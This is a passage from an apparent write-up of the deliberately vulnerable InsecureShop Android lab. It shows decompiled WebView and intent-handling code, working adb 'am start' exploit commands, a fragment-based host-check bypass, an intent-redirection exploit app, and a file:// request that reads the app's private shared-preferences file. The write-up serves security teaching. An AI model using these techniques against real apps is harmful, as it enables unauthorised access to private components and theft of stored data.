</pre></table></code></div></div><p>Let’s examine the actual code of the <code class="language-plaintext highlighter-rouge">WebViewActivity</code> class:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">WebViewActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
<span class="c1">// ...........some code truncated............. </span>
<span class="nd">@Override</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// ...........some code truncated............. </span>
    <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
    <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="s">"intent"</span><span class="o">);</span>
    <span class="nc">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getData</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">uri</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span> <span class="n">data</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="n">data</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="c1">// ...........some code truncated............. </span>
        <span class="c1">// Checking if the Path of the URL contains "/web"</span>
        <span class="k">if</span> <span class="o">(</span><span class="nc">StringsKt</span><span class="o">.</span><span class="na">equals</span><span class="n">$default</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getPath</span><span class="o">(),</span> <span class="s">"/web"</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
            <span class="nc">Intent</span> <span class="n">intent2</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
            <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">intent2</span><span class="o">,</span> <span class="s">"intent"</span><span class="o">);</span>
            <span class="nc">Uri</span> <span class="n">data2</span> <span class="o">=</span> <span class="n">intent2</span><span class="o">.</span><span class="na">getData</span><span class="o">();</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">data2</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">data</span> <span class="o">=</span> <span class="n">data2</span><span class="o">.</span><span class="na">getQueryParameter</span><span class="o">(</span><span class="s">"url"</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="c1">// ...........some code truncated............. </span>
        <span class="k">if</span> <span class="o">(</span><span class="n">data</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">finish</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="n">webview</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
        <span class="nc">Prefs</span><span class="o">.</span><span class="na">INSTANCE</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="k">this</span><span class="o">).</span><span class="na">setData</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Let’s examine our code to know what it is doing:</p><ul><li>Getting the Intent Data and store it on a URI Object.<li>If the Path of the URL contains “/web”, It will take the value of the URL parameter <code class="language-plaintext highlighter-rouge">?url=</code> and store it in the variable <code class="language-plaintext highlighter-rouge">data</code><li>At the end, it loads the WebView of the variable data if it’s not null <code class="language-plaintext highlighter-rouge">webview.loadUrl(data);</code>.</ul><p>By examining the code, we observed:</p><ul><li>The Intent used here is an implicit intent, cause it receives the data from any app.<li>The specified intent data are only the <code class="language-plaintext highlighter-rouge">android:scheme</code> and <code class="language-plaintext highlighter-rouge">android:host</code> as indicated in the android manifest file.<li>Any value will be passed to the URL parameter <code class="language-plaintext highlighter-rouge">?url=</code> will be loaded via a WebView. Without any validation on the URL.</ul><p>Let’s Craft our exploit.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c"># Scheme: insecureshop</span>
<span class="c"># host: com.insecureshop</span>
<span class="c"># Path: /web/</span>
<span class="c"># Parameter: ?url=</span>
root@generic_x86:/ <span class="nv">$ </span>am start <span class="nt">-a</span> android.intent.action.VIEW <span class="nt">-d</span> insecureshop://com.insecureshop/web?url<span class="o">=</span>https://itsfading.github.io
Starting: Intent <span class="o">{</span> <span class="nv">act</span><span class="o">=</span>android.intent.action.VIEW <span class="nv">dat</span><span class="o">=</span>insecureshop://com.insecureshop/web?url<span class="o">=</span>https://itsfading.github.io <span class="o">}</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%206.png" alt="image.png" /></p><h2 id="weak-host-validation-check"><strong>Weak Host Validation Check</strong></h2><blockquote><p><strong>Description:</strong> Possible to bypass host validation check to load any arbitrary URL in WebView.</p></blockquote><p>This challenge is similar to the previous one, but it wants us to bypass the host validation check. The <code class="language-plaintext highlighter-rouge">WebViewActivity</code> class contains two conditions: the first one checks if the path of the URL contains <code class="language-plaintext highlighter-rouge">/web</code> and the second case checks if it contains <code class="language-plaintext highlighter-rouge">webview</code> :</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre>
<span class="kd">public</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">WebViewActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
<span class="c1">// ...........some code truncated.............</span>
<span class="nd">@Override</span> 
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// ...........some code truncated.............</span>
    <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
    <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="s">"intent"</span><span class="o">);</span>
    <span class="nc">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getData</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">uri</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span> <span class="n">data</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="n">data</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>
            <span class="c1">// ...........some code truncated............. </span>
        <span class="c1">// Checking if the Path of the URL contains "/webview"</span>
        <span class="k">else</span> <span class="nf">if</span> <span class="o">(</span><span class="nc">StringsKt</span><span class="o">.</span><span class="na">equals</span><span class="n">$default</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getPath</span><span class="o">(),</span> <span class="s">"/webview"</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
            <span class="nc">Intent</span> <span class="n">intent3</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
            <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">intent3</span><span class="o">,</span> <span class="s">"intent"</span><span class="o">);</span>
            <span class="nc">Uri</span> <span class="n">data3</span> <span class="o">=</span> <span class="n">intent3</span><span class="o">.</span><span class="na">getData</span><span class="o">();</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">data3</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">throwNpe</span><span class="o">();</span>
            <span class="o">}</span>
            <span class="nc">String</span> <span class="n">queryParameter</span> <span class="o">=</span> <span class="n">data3</span><span class="o">.</span><span class="na">getQueryParameter</span><span class="o">(</span><span class="s">"url"</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">queryParameter</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">throwNpe</span><span class="o">();</span>
            <span class="o">}</span>
            <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">queryParameter</span><span class="o">,</span> <span class="s">"intent.data!!.getQueryParameter(\"url\")!!"</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="nc">StringsKt</span><span class="o">.</span><span class="na">endsWith</span><span class="n">$default</span><span class="o">(</span><span class="n">queryParameter</span><span class="o">,</span> <span class="s">"insecureshopapp.com"</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="o">(</span><span class="nc">Object</span><span class="o">)</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
                <span class="nc">Intent</span> <span class="n">intent4</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
                <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">intent4</span><span class="o">,</span> <span class="s">"intent"</span><span class="o">);</span>
                <span class="nc">Uri</span> <span class="n">data4</span> <span class="o">=</span> <span class="n">intent4</span><span class="o">.</span><span class="na">getData</span><span class="o">();</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">data4</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">data</span> <span class="o">=</span> <span class="n">data4</span><span class="o">.</span><span class="na">getQueryParameter</span><span class="o">(</span><span class="s">"url"</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">data</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">finish</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="n">webview</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
        <span class="nc">Prefs</span><span class="o">.</span><span class="na">INSTANCE</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="k">this</span><span class="o">).</span><span class="na">setData</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Let’s examine our code to know what it is doing:</p><ul><li>Getting the Intent Data and storing it on a URI Object.<li>Checking If the Path of the URL contains <code class="language-plaintext highlighter-rouge">/webview</code>.<li>Checking If the passed data from the intent contains a <code class="language-plaintext highlighter-rouge">?url=</code> parameter and its value is not empty.<li>Checking If the <code class="language-plaintext highlighter-rouge">?url=</code> query parameter value ends with <code class="language-plaintext highlighter-rouge">insecureshopapp.com</code>.<li>Lastly, it will take the value of the URL parameter <code class="language-plaintext highlighter-rouge">?url=</code> and store it in the variable <code class="language-plaintext highlighter-rouge">data4</code> .<li>At the end, it loads a WebView of the variable data if it’s not null <code class="language-plaintext highlighter-rouge">webview.loadUrl(data);</code> .</ul><p>By examining the code, we observed:</p><ul><li>The new code prevents the user from loading any URL other than <code class="language-plaintext highlighter-rouge">"insecureshopapp.com"</code>. So it checks if the URL query parameter value ends with it.<li>but we can bypass that easily by just adding the fragment <code class="language-plaintext highlighter-rouge">#</code> and URL encode it. This will bypass the <code class="language-plaintext highlighter-rouge">endwith</code> function check and load the desired URL.</ul><p>Let’s Craft our exploit:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c"># Scheme: insecureshop</span>
<span class="c"># Host: com.insecureshop</span>
<span class="c"># Path: /webview/</span>
<span class="c"># Parameter: ?url=</span>
root@generic_x86:/ <span class="nv">$ </span>am start <span class="nt">-a</span> android.intent.action.VIEW <span class="nt">-d</span> insecureshop://com.insecureshop/webview?url<span class="o">=</span>https://itsfading.github.io%23insecureshopapp.com
Starting: Intent <span class="o">{</span> <span class="nv">act</span><span class="o">=</span>android.intent.action.VIEW <span class="nv">dat</span><span class="o">=</span>insecureshop://com.insecureshop/webview?url<span class="o">=</span>https://itsfading.github.io#insecureshopapp.com <span class="o">}</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%207.png" alt="image.png" /></p><h2 id="access-to-protected-components--intent-redirection-"><strong>Access to Protected Components ( Intent Redirection )</strong></h2><blockquote><p><strong>Description:</strong> The app takes an embedded Intent and passes it to method like <code class="language-plaintext highlighter-rouge">startActivity</code>. This allows any third party app to launch any protected component.</p></blockquote><p>As the challenge description suggests, there should be an intent being passed to the <code class="language-plaintext highlighter-rouge">startActivity </code> Function. I have searched through the code, and this one on the <code class="language-plaintext highlighter-rouge">com.insecureshop.WebView2Activity</code> caught my eye:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%208.png" alt="image.png" /></p><p>Let’s review the code:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span> 
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setContentView</span><span class="o">(</span><span class="no">C0893R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_webview</span><span class="o">);</span>
    <span class="n">setSupportActionBar</span><span class="o">((</span><span class="nc">Toolbar</span><span class="o">)</span> <span class="n">_$_findCachedViewById</span><span class="o">(</span><span class="no">C0893R</span><span class="o">.</span><span class="na">C0896id</span><span class="o">.</span><span class="na">toolbar</span><span class="o">));</span>
    <span class="n">setTitle</span><span class="o">(</span><span class="n">getString</span><span class="o">(</span><span class="no">C0893R</span><span class="o">.</span><span class="na">string</span><span class="o">.</span><span class="na">webview</span><span class="o">));</span>
    <span class="nc">Intent</span> <span class="n">extraIntent</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Intent</span><span class="o">)</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getParcelableExtra</span><span class="o">(</span><span class="s">"extra_intent"</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">extraIntent</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">startActivity</span><span class="o">(</span><span class="n">extraIntent</span><span class="o">);</span>
        <span class="n">finish</span><span class="o">();</span>
        <span class="k">return</span><span class="o">;</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Here is, the code is waiting to receive an Intent with the key <code class="language-plaintext highlighter-rouge">extra_intent</code> but the dangerous part here is that the received intent is being passed to the <code class="language-plaintext highlighter-rouge">startActivity</code> function, which will allow us to access any intent in the application even if it is not exported. Let’s search for an activity like that in our app:</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">"com.insecureshop.PrivateActivity"</span> <span class="na">android:exported=</span><span class="s">"false"</span><span class="nt">/&gt;</span>
</pre></table></code></div></div><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">String</span> <span class="n">data</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"url"</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">data</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">data</span> <span class="o">=</span> <span class="s">"https://www.insecureshopapp.com"</span><span class="o">;</span> 
    <span class="o">}</span>
    <span class="n">webview</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
    <span class="nc">Prefs</span><span class="o">.</span><span class="na">INSTANCE</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="k">this</span><span class="o">).</span><span class="na">setData</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Here is, the <code class="language-plaintext highlighter-rouge">PrivateActivity</code> is an unexported activity that cannot be accessed directly, so we can exploit the vulnerability that arises in the <code class="language-plaintext highlighter-rouge">WebView2Activity</code> to access it. We have two ways to exploit it, using the ADB AM or by creating an exploit application. Unfortunately, I have tried a lot with the am command, but I couldn’t figure out the correct command. So let’s create an exploit app. I will create an app with an empty activity through Android Studio and add the following code:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
<span class="nd">@Override</span>
<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
    <span class="nc">Button</span> <span class="nc">IntentButton</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Button</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">IntentButton</span><span class="o">);</span>
    <span class="c1">// Set a click listener to send the intent</span>
    <span class="nc">IntentButton</span><span class="o">.</span><span class="na">setOnClickListener</span><span class="o">(</span><span class="k">new</span> <span class="nc">View</span><span class="o">.</span><span class="na">OnClickListener</span><span class="o">()</span> <span class="o">{</span>
        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onClick</span><span class="o">(</span><span class="nc">View</span> <span class="n">v</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// Making an Intent to the PrivateActivity with the extra "url"</span>
            <span class="nc">Intent</span> <span class="n">privateActivityIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
            <span class="n">privateActivityIntent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.insecureshop"</span><span class="o">,</span> <span class="s">"com.insecureshop.PrivateActivity"</span><span class="o">);</span>
            <span class="n">privateActivityIntent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"url"</span><span class="o">,</span> <span class="s">"https://itsfading.github.io"</span><span class="o">);</span>

        <span class="c1">// Passing the whole intent to the extra_intent So we trigger the startActivity in the WebView2Activity class</span>
            <span class="nc">Intent</span> <span class="n">webViewIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
            <span class="n">webViewIntent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.insecureshop"</span><span class="o">,</span> <span class="s">"com.insecureshop.WebView2Activity"</span><span class="o">);</span>
            <span class="n">webViewIntent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"extra_intent"</span><span class="o">,</span> <span class="n">privateActivityIntent</span><span class="o">);</span> 
            <span class="n">startActivity</span><span class="o">(</span><span class="n">webViewIntent</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">});</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%209.png" alt="image.png" /></p><p>Once the button is clicked, the URL will be launched, indicating the access of the <code class="language-plaintext highlighter-rouge">privateActivity</code> Intent.</p><h2 id="unprotected-data-uris"><strong>Unprotected Data URIs</strong></h2><blockquote><p><strong>Description:</strong> The untrusted URI’s passed via <code class="language-plaintext highlighter-rouge">loadUrl</code> method allows attackers to pass arbitrary URL in webview.</p></blockquote><p>This challenge is similar to others, as we have an implicit intent in the <code class="language-plaintext highlighter-rouge">com.insecureshop.WebView2Activity</code> that is exported. But this time it takes any value from us and tries to load it with WebView and that means we can access internal files also.</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>        <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
        <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="s">"intent"</span><span class="o">);</span>
        <span class="nc">String</span> <span class="n">dataString</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getDataString</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(!(</span><span class="n">dataString</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nc">StringsKt</span><span class="o">.</span><span class="na">isBlank</span><span class="o">(</span><span class="n">dataString</span><span class="o">)))</span> <span class="o">{</span>
            <span class="nc">Intent</span> <span class="n">intent2</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
            <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">intent2</span><span class="o">,</span> <span class="s">"intent"</span><span class="o">);</span>
            <span class="n">webview</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">intent2</span><span class="o">.</span><span class="na">getDataString</span><span class="o">());</span>
            <span class="k">return</span><span class="o">;</span>
        <span class="o">}</span>
</pre></table></code></div></div><p>Let’s call the Intent:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Muhammad</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">adb</span><span class="w"> </span><span class="nx">shell</span><span class="w">  </span><span class="nx">am</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="nx">com.insecureshop/.WebView2Activity</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">https://itsfading.github.io</span><span class="w">
</span><span class="n">Starting:</span><span class="w"> </span><span class="nx">Intent</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">dat</span><span class="o">=</span><span class="n">https://itsfading.github.io/...</span><span class="w"> </span><span class="nx">cmp</span><span class="o">=</span><span class="n">com.insecureshop/.WebView2Activity</span><span class="w"> </span><span class="p">}</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Muhammad</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">adb</span><span class="w"> </span><span class="nx">shell</span><span class="w">  </span><span class="nx">am</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="nx">com.insecureshop/.WebView2Activity</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">file:///data/data/com.insecureshop/shared_prefs/Prefs.xml</span><span class="w"> 
</span><span class="n">Starting:</span><span class="w"> </span><span class="nx">Intent</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">dat</span><span class="o">=</span><span class="n">file:///data/data/com.insecureshop/shared_prefs/Prefs.xml</span><span class="w"> </span><span class="nx">cmp</span><span class="o">=</span><span class="n">com.insecureshop/.WebView2Activity</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%2010.png" alt="image.png" /></p><h2 id="theft-of-arbitrary-files"><strong>Theft of Arbitrary Files</strong></h2><blockquote><p><strong>Description:</strong> Possible to steal files from app’s local storage via ChooserActivity.</p></blockquote><p>Let’s review the code of the <code class="language-plaintext highlighter-rouge">ChooserActivity</code>.</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">ChooserActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setContentView</span><span class="o">(</span><span class="no">C0893R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_chooser</span><span class="o">);</span>
    <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
    <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="s">"intent"</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">intent</span><span class="o">.</span><span class="na">getExtras</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Parcelable</span> <span class="n">parcelableExtra</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getParcelableExtra</span><span class="o">(</span><span class="s">"android.intent.extra.STREAM"</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">parcelableExtra</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="nc">Uri</span><span class="o">.</span><span class="na">fromFile</span><span class="o">(</span><span class="k">new</span> <span class="nc">File</span><span class="o">(((</span><span class="nc">Uri</span><span class="o">)</span> <span class="n">parcelableExtra</span><span class="o">).</span><span class="na">toString</span><span class="o">()));</span>
            <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="s">"Uri.fromFile(File(uri.toString()))"</span><span class="o">);</span>
            <span class="n">makeTempCopy</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="n">getFilename</span><span class="o">(</span><span class="n">uri</span><span class="o">));</span>
            <span class="k">return</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nf">TypeCastException</span><span class="o">(</span><span class="s">"null cannot be cast to non-null type android.net.Uri"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>

